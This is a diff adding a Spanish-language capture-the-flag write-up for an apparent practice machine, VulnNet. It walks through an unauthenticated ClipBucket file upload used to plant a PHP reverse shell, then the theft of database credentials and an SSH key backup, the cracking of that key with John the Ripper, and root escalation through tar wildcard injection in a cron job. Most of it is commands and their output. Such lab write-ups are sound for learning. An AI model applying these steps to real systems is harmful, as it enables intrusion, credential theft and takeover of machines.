@@ -194,4 +194,324 @@ ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Inject
 ---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 
-Si que hay
+Voy a explotarlo de esta manera.
+
+2. Unauthenticated Arbitrary File Upload
+Below is the cURL request to upload arbitrary files to the webserver with no
+authentication required.
+
+$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
+"http://$HOST/actions/beats_uploader.php"
+
+$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
+"http://$HOST/actions/photo_uploader.php"
+
+Si que hay, veo la información del exploit y al parecer puedo subir archivos sin comprobación. Voy a probar con una revshell.
+
+curl -u developers:9972761drmfsls -F "file=@revshell.php" -F "plupload=1" -F "name=revshell.php" "http://broadcast.vulnnet.thm/actions/photo_uploader.php"
+{"success":"yes","file_name":"1779377362f9bb91","extension":"php","file_directory":"2026\/05\/21"} 
+
+Se ha subido correctamente. 
+Abro un puerto y voy a buscar el archivo.
+
+nc -lnvp 9003
+Listening on 0.0.0.0 9003
+
+http://broadcast.vulnnet.thm/files/photos/2026/05/21/1779377362f9bb91.php
+
+Y efectivamente, consigo una revshell 
+nc -lnvp 9003
+Listening on 0.0.0.0 9003
+Connection received on 10.130.149.47 33754
+Linux vulnnet 4.15.0-134-generic #138-Ubuntu SMP Fri Jan 15 10:52:18 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 17:32:25 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+$ 
+
+Estabilizo la shell, y comienzo a ver si hay algo interesante:
+
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@vulnnet:/$ 
+
+Buscando alguna manera de escalar privilegios, voy a ver la carpeta de includes de apache, para ver si tiene alguna configuración.
+
+www-data@vulnnet:/var/www/html/includes$ ls
+ls
+active.php	      defined_links.php       functions_video.php
+admin.functions.php   email_templates	      index.php
+admin_config.php      flv_player.php	      init.php
+adminfunctions.php    functions.php	      langs
+adodb		      functions_actions.php   languages.php
+classes		      functions_db.php	      modules.php
+clipbucket.php	      functions_filter.php    plugin.functions.php
+common.php	      functions_helper.php    plugins.php
+config.inc.php	      functions_photo.php     plugins_functions.php
+conversion.conf.php   functions_player.php    smartyv3
+dbconnect.php	      functions_playlist.php  templatelib
+dbconnect.sample.php  functions_template.php  upload_forms.php
+define_php_links.php  functions_user.php      whois
+
+
+Hay varias cosas interesantes, varios archivos que apuntan a DB, y en dbconnect.php encuentro credenciales.
+
+cat dbconnect.php
+cat dbconnect.php
+<?php
+
+	/**
+	* @Software : ClipBucket
+	* @License : CBLA
+	* @version :ClipBucket v2.1
+	*/
+
+	$BDTYPE = 'mysql';
+	//Database Host
+	$DBHOST = '';
+	//Database Name
+	$DBNAME = 'VulnNet';
+	//Database Username
+	$DBUSER = 'admin';
+	//Database Password
+	$DBPASS = 'VulnNetAdminPass0990';
+	//Setting Table Prefix
+	define('TABLE_PREFIX','cb_');
+
+
+    $db = new Clipbucket_db();
+
+    $db->connect($DBHOST,$DBNAME,$DBUSER,$DBPASS);
+
+/*
+	require 'adodb/adodb.inc.php';
+
+	$db             = ADONewConnection($BDTYPE);
+	$db->debug      = false;
+	$db->charpage   = 'cp_utf8';
+	$db->charset    = 'utf8';
+	if(!$db->Connect($DBHOST, $DBUSER, $DBPASS, $DBNAME))
+	{
+	    exit($db->ErrorMsg());
+	}
+	$db->Connect($DBHOST, $DBUSER, $DBPASS, $DBNAME);
+	
+        $db->SetFetchMode(ADODB_FETCH_ASSOC); 
+        
+	$db->Execute('SET NAMES utf8');
+	$db->Execute('SET CHARACTER SET utf8');
+	$db->Execute('SET COLLATION_CONNECTION="utf8_general_ci"');
+*/
+
+admin:VulnNetAdminPass0990 
+
+Me logueo en mysql, pero no encuentro nada relevante.
+Pruebo a usarlas por ssh, por si se hubieran reutilizado, pero tampoco funciona.
+
+Sigo buscando. Tras un rato, vuelvo a la carpeta /var y en /backups encuentro lo siguiente:
+
+www-data@vulnnet:/var/backups$ ls
+ls
+alternatives.tar.0     dpkg.diversions.2.gz    group.bak
+apt.extended_states.0  dpkg.statoverride.0     gshadow.bak
+dpkg.arch.0	       dpkg.statoverride.1.gz  passwd.bak
+dpkg.arch.1.gz	       dpkg.statoverride.2.gz  shadow.bak
+dpkg.arch.2.gz	       dpkg.status.0	       ssh-backup.tar.gz
+dpkg.diversions.0      dpkg.status.1.gz        vulnnet-Monday.tgz
+dpkg.diversions.1.gz   dpkg.status.2.gz        vulnnet-Thursday.tgz
+
+Los archivos shadow.bak y ssh-backup.tar.gz me parecen interesantes.
+Tras ver los permisos de los archivos, me doy cuenta de que el único legible es ssh-backup.tar.gz
+
+Al intentar descomprimirla en la máquina, no me deja, asique me descargo la carpeta.
+
+www-data@vulnnet:/var/backups$ python3 -m http.server 8080 
+python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+192.168.132.209 - - [21/May/2026 17:49:12] "GET /ssh-backup.tar.gz HTTP/1.1" 200 -
+
+Dentro de la carpeta hay una clave ssh encriptada.
+
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,6CE1A97A7DAB4829FE59CC561FB2CCC4
+
+mRFDRL15t7qvaZxJGHDJsewnhp7wESbEGxeAWtCrbeIVJbQIQd8Z8SKzpvTMFLtt
+dseqsGtt8HSruVIq++PFpXRrBDG5F4rW5B6VDOVMk1O9J4eHEV0N7es+hZ22o2e9
+60qqj7YkSY9jVj5Nqq49uUNUg0G0qnWh8M6r8r83Ov+HuChdeNC5CC2OutNivl7j
+dmIaFRFVwmWNJUyVen1FYMaxE+NojcwsHMH8aV2FTiuMUsugOwZcMKhiRPTElojn
+tDrlgNMnP6lMkQ6yyJEDNFtn7tTxl7tqdCIgB3aYQZXAfpQbbfJDns9EcZEkEkrp
+hs5Li20NbZxrtI6VPq6/zDU1CBdy0pT58eVyNtDfrUPdviyDUhatPACR20BTjqWg
+3BYeAznDF0MigX/AqLf8vA2HbnRTYWQSxEnAHmnVIKaNVBdL6jpgmw4RjGzsUctk
+jB6kjpnPSesu4lSe6n/f5J0ZbOdEXvDBOpu3scJvMTSd76S4n4VmNgGdbpNlayj5
+5uJfikGR5+C0kc6PytjhZrnODRGfbmlqh9oggWpflFUm8HgGOwn6nfiHBNND0pa0
+r8EE1mKUEPj3yfjLhW6PcM2OGEHHDQrdLDy3lYRX4NsCRSo24jtgN1+aQceNFXQ7
+v8Rrfu5Smbuq3tBjVgIWxolMy+a145SM1Inewx4V4CX1jkk6sp0q9h3D03BYxZjz
+n/gMR/cNgYjobbYIEYS9KjZSHTucPANQxhUy5zQKkb61ymsIR8O+7pHTeReelPDq
+nv7FA/65Sy3xSUXPn9nhqWq0+EnhLpojcSt6czyX7Za2ZNP/LaFXpHjwYxBgmMkf
+oVmLmYrw6pOrLHb7C5G6eR6D/WwRjhPpuhCWWnz+NBDQXIwUzzQvAyHyb7D1+Itn
+MesF+L9zuUADGeuFl12dLahapM5ZuKURwnzW9+RwmmJSuT0AnN5OyuJtwfRznjyZ
+7f5NP9u6vF0NQHYZI7MWcH7PAQsGTw3xzBmJdIfF71DmG0rqqCR7sB2buhoI4ve3
+obvpmg2CvE+rnGS3wxuaEO0mWxVrSYiWdi7LJZvppwRF23AnNYNTeCw4cbvvCBUd
+hKvhau01yVW2N/R8B43k5G9qbeNUmIZIltJZaxHnQpJGIbwFSItih49Fyr29nURK
+ZJbyJbb4+Hy2ZNN4m/cfPNmCFG+w0A78iVPrkzxdWuTaBOKBstzpvLBA20d4o3ow
+wC6j98TlmFUOKn5kJmX1EQAHJmNwERNKFmNwgHqgwYNzIhGRNdyoqJxBrshVjRk9
+GSEZHtyGNoBqesyZg8YtsYIFGppZFQmVumGCRlfOGB9wPcAmveC0GNfTygPQlEMS
+hoz4mTIvqcCwWibXME2g8M9NfVKs7M0gG5Xb93MLa+QT7TyjEn6bDa01O2+iOXkx
+0scKMs4v3YBiYYhTHOkmI5OX0GVrvxKVyCJWY1ldVfu+6LEgsQmUvG9rYwO4+FaW
+4cI3x31+qDr1tCJMLuPpfsyrayBB7duj/Y4AcWTWpY+feaHiDU/bQk66SBqW8WOb
+d9vxlTg3xoDcLjahDAwtBI4ITvHNPp+hDEqeRWCZlKm4lWyI840IFMTlVqwmxVDq
+-----END RSA PRIVATE KEY-----
+
+La paso por ssh2john.
+ssh2john id_rsa 
+id_rsa:$sshng$1$16$6CE1A97A7DAB4829FE59CC561FB2CCC4$1200$99114344bd79b7baaf699c491870c9b1ec27869ef01126c41b17805ad0ab6de21525b40841df19f122b3a6f4cc14bb6d76c7aab06b6df074abb9522afbe3c5a5746b0431b9178ad6e41e950ce54c9353bd278787115d0dedeb3e859db6a367bdeb4aaa8fb624498f63563e4daaae3db943548341b4aa75a1f0ceabf2bf373aff87b8285d78d0b9082d8ebad362be5ee376621a151155c2658d254c957a7d4560c6b113e3688dcc2c1cc1fc695d854e2b8c52cba03b065c30a86244f4c49688e7b43ae580d3273fa94c910eb2c89103345b67eed4f197bb6a7422200776984195c07e941b6df2439ecf44719124124ae986ce4b8b6d0d6d9c6bb48e953eaebfcc3535081772d294f9f1e57236d0dfad43ddbe2c835216ad3c0091db40538ea5a0dc161e0339c3174322817fc0a8b7fcbc0d876e7453616412c449c01e69d520a68d54174bea3a609b0e118c6cec51cb648c1ea48e99cf49eb2ee2549eea7fdfe49d196ce7445ef0c13a9bb7b1c26f31349defa4b89f856636019d6e93656b28f9e6e25f8a4191e7e0b491ce8fcad8e166b9ce0d119f6e696a87da20816a5f945526f078063b09fa9df88704d343d296b4afc104d6629410f8f7c9f8cb856e8f70cd8e1841c70d0add2c3cb7958457e0db02452a36e23b60375f9a41c78d15743bbfc46b7eee5299bbaaded063560216c6894ccbe6b5e3948cd489dec31e15e025f58e493ab29d2af61dc3d37058c598f39ff80c47f70d8188e86db6081184bd2a36521d3b9c3c0350c61532e7340a91beb5ca6b0847c3beee91d379179e94f0ea9efec503feb94b2df14945cf9fd9e1a96ab4f849e12e9a23712b7a733c97ed96b664d3ff2da157a478f063106098c91fa1598b998af0ea93ab2c76fb0b91ba791e83fd6c118e13e9ba10965a7cfe3410d05c8c14cf342f0321f26fb0f5f88b6731eb05f8bf73b9400319eb85975d9d2da85aa4ce59b8a511c27cd6f7e4709a6252b93d009cde4ecae26dc1f4739e3c99edfe4d3fdbbabc5d0d40761923b316707ecf010b064f0df1cc19897487c5ef50e61b4aeaa8247bb01d9bba1a08e2f7b7a1bbe99a0d82bc4fab9c64b7c31b9a10ed265b156b498896762ecb259be9a70445db7027358353782c3871bbef08151d84abe16aed35c955b637f47c078de4e46f6a6de35498864896d2596b11e742924621bc05488b62878f45cabdbd9d444a6496f225b6f8f87cb664d3789bf71f3cd982146fb0d00efc8953eb933c5d5ae4da04e281b2dce9bcb040db4778a37a30c02ea3f7c4e598550e2a7e642665f511000726637011134a166370807aa0c1837322119135dca8a89c41aec8558d193d1921191edc8636806a7acc9983c62db182051a9a59150995ba61824657ce181f703dc026bde0b418d7d3ca03d0944312868cf899322fa9c0b05a26d7304da0f0cf4d7d52aceccd201b95dbf7730b6be413ed3ca3127e9b0dad353b6fa2397931d2c70a32ce2fdd80626188531ce926239397d0656bbf1295c8225663595d55fbbee8b120b10994bc6f6b6303b8f85696e1c237c77d7ea83af5b4224c2ee3e97eccab6b2041eddba3fd8e007164d6a58f9f79a1e20d4fdb424eba481a96f1639b77dbf1953837c680dc2e36a10c0c2d048e084ef1cd3e9fa10c4a9e45609994a9b8956c88f38d0814c4e556ac26c550ea
+
+Y la crackeo.
+
+john-the-ripper --wordlist=/home/mksk/wordlists/rockyou.txt hash.txt 
+Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
+Use the "--format=ssh-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 3DES/AES 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 16 OpenMP threads
+Note: Passwords longer than 10 [worst case UTF-8] to 32 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+oneTWO3gOyac     (id_rsa)     
+1g 0:00:00:00 DONE (2026-05-21 17:53) 2.778g/s 13631Kp/s 13631Kc/s 13631KC/s oneal4462..one98six
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+La muevo a mi directorio de ssh, y le doy los permisos necesario.
+chmod 600 id_rsa
+
+Ahora intento el login. Dado que solo hay un usuario en la máquina aparte de root, doy por hecho que es server-management
+
+ ssh -i id_rsa server-management@10.130.149.47
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-134-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+560 packages can be updated.
+359 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Consigo acceso por ssh, ahora puedo cerrar la otra shell, y buscar maneras de escalar privilegios.
+
+En el directorio /home esta la primera flag:
+
+cat user.txt 
+THM{907*********************1e8b}
+
+Busco escalar privilegios por binarios, pero no encuentro nada interesante.
+
+find / -perm -4000 2>/dev/null
+/usr/sbin/pppd
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/traceroute6.iputils
+/usr/bin/chsh
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/bin/ntfs-3g
+/bin/su
+/bin/umount
+/bin/mount
+/bin/ping
+/bin/fusermount
+
+El siguiente paso es comprobar los cronjobs.
+
+server-management@vulnnet:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+*/2   * * * *	root	/var/opt/backupsrv.sh
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+Hay un cronjob que se ejecuta cada 2 minutos con permisos de root. 
+
+cat /var/opt/backupsrv.sh 
+#!/bin/bash
+
+# Where to backup to.
+dest="/var/backups"
+
+# What to backup. 
+cd /home/server-management/Documents
+backup_files="*"
+
+# Create archive filename.
+day=$(date +%A)
+hostname=$(hostname -s)
+archive_file="$hostname-$day.tgz"
+
+# Print start status message.
+echo "Backing up $backup_files to $dest/$archive_file"
+date
+echo
+
+# Backup the files using tar.
+tar czf $dest/$archive_file $backup_files
+
+# Print end status message.
+echo
+echo "Backup finished"
+date
+
+# Long listing of files in $dest to check file sizes.
+ls -lh $dest
+
+El script es vulnerable, el comando tar entiende los nombres de archivos como opciones.
+Me voy a /Documents y creo los siguientes archivos 
+server-management@vulnnet:~/Documents$ touch -- --checkpoint=1
+server-management@vulnnet:~/Documents$ touch -- --checkpoint-action=exec=sh\ shell.sh
+server-management@vulnnet:~/Documents$ echo '#!/bin/bash' > shell.sh
+server-management@vulnnet:~/Documents$ echo 'chmod u+s /bin/bash' >> shell.sh
+
+Ahora espero un par de minutos a que se ejecute, y compruebo que ha funcionado.
+
+server-management@vulnnet:~/Documents$ /bin/bash -p
+bash-4.4# whoami
+root
+
+Y consigo la segunda flag.
+cat /root/root.txt
+THM{22**********************5ba}
+
